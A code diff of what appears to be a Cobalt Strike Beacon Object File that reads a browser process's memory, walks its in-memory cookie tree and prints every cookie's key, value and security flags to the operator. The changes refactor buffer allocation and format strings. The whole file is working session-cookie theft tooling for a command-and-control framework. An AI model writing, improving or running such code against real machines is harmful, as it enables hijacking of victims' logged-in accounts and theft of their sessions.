@@ -110,28 +110,25 @@ extern "C" {
         BeaconFormatPrintf(buffer, "    Last updated: ");
         PrintTimeStamp(cookie.last_update_date, buffer);
         BeaconFormatPrintf(buffer, "    Secure: %s\n", cookie.secure ? "True" : "False");
-        BeaconFormatPrintf(buffer, "    HttpOnly: %s\n", cookie.httponly ? "True" : "False");
+        BeaconFormatPrintf(buffer, "    HttpOnly: %s", cookie.httponly ? "True" : "False");
     }
 
-    void ProcessNode(HANDLE hProcess, const Node& node) {
-        formatp buffer;
-        BeaconFormatAlloc(&buffer, 1024); //Overkill, but better than underkill?
-
-        BeaconPrintf(CALLBACK_OUTPUT, "Cookie Key: ");
-        ReadString(hProcess, node.key, &buffer);
-
-        BeaconPrintf(CALLBACK_OUTPUT, "%s\n\n", BeaconFormatToString(&buffer, NULL));
+    void ProcessNode(HANDLE hProcess, const Node& node, formatp* buffer) {
+        BeaconFormatReset(buffer);
+        BeaconFormatPrintf(buffer, "Cookie Key: ");
+        ReadString(hProcess, node.key, buffer);
 
 #ifdef _DEBUG
         BeaconPrintf(CALLBACK_OUTPUT, "Attempting to read cookie values from address:  0x%p\n", (void*)node.valueAddress);
 #endif
-        ProcessNodeValue(hProcess, node.valueAddress, &buffer);
+        ProcessNodeValue(hProcess, node.valueAddress, buffer);
+        BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(buffer, NULL));
 
         //Process the left child if it exists
         if (node.left != 0) {
             Node leftNode;
             if (ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(node.left), &leftNode, sizeof(Node), nullptr))
-                ProcessNode(hProcess, leftNode);
+                ProcessNode(hProcess, leftNode, buffer);
             else
                 BeaconPrintf(CALLBACK_ERROR, "Error reading left node! Error: %i\n", GetLastError());
         }
@@ -140,11 +137,10 @@ extern "C" {
         if (node.right != 0) {
             Node rightNode;
             if (ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(node.right), &rightNode, sizeof(Node), nullptr))
-                ProcessNode(hProcess, rightNode);
+                ProcessNode(hProcess, rightNode, buffer);
             else
                 BeaconPrintf(CALLBACK_ERROR, "Error reading right node! Error: %i\n", GetLastError());
         }
-        BeaconFormatFree(&buffer);
     }
 
     void WalkCookieMap(HANDLE hProcess, uintptr_t cookieMapAddress) {
@@ -159,7 +155,7 @@ extern "C" {
 #ifdef _DEBUG
         BeaconPrintf(CALLBACK_OUTPUT, "Address of beginNode: 0x%p\n", (void*)cookieMap.beginNode);
         BeaconPrintf(CALLBACK_OUTPUT, "Address of firstNode: 0x%p\n", (void*)cookieMap.firstNode);
-        BeaconPrintf(CALLBACK_OUTPUT, "Size of the cookie map: %zu\n", cookieMap.size);
+        BeaconPrintf(CALLBACK_OUTPUT, "Size of the cookie map: %Iu\n", cookieMap.size);
 #endif
 
         if (cookieMap.firstNode == 0) //CookieMap was empty
@@ -168,13 +164,18 @@ extern "C" {
             return;
         }
 
-        BeaconPrintf(CALLBACK_OUTPUT, "[*] Number of available cookies: %zu\n", cookieMap.size);
+        BeaconPrintf(CALLBACK_OUTPUT, "[*] Number of available cookies: %Iu\n", cookieMap.size);
         // Process the first node of the binary search tree
         Node firstNode;
-        if (ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(cookieMap.firstNode), &firstNode, sizeof(Node), nullptr) && &firstNode != nullptr)
-            ProcessNode(hProcess, firstNode);
-        else
+        if (ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(cookieMap.firstNode), &firstNode, sizeof(Node), nullptr) && &firstNode != nullptr) {
+            formatp buffer;
+            BeaconFormatAlloc(&buffer, 5*1024); // RFC 6265 specifies: "At least 4096 bytes per cookie"
+            ProcessNode(hProcess, firstNode, &buffer);
+            BeaconFormatFree(&buffer);
+        }
+        else {
             BeaconPrintf(CALLBACK_ERROR, "Error reading first node! Error: %i\n", GetLastError());
+        }
     }
 
     BOOL FindPattern(HANDLE hProcess, const BYTE* pattern, size_t patternSize, uintptr_t* cookieMonsterInstances, size_t& szCookieMonster) {
